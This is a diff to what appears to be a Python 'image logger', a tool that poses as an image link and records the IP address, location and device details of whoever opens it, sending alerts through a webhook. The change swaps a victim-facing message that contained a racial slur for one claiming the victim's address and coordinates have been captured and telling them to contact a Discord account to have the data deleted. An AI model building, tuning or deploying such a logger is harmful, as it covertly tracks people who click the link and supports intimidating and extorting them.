@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "get fucked by unthrivingfaces image logger bum nigga", # Message to show
+        "message": "shouldnt have clicked on this link. now i have your ip address, your house address, your coordnates, your device your visiting this web on, your timezone, your country, and your region. if you want me to delete this add my discord hellomynameistrapstxr", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -101,7 +101,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - Link Sent",
             "color": config["color"],
-            "description": f"link sent, you might get a ip soon ma broda`",
+            "description": f"link sent",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
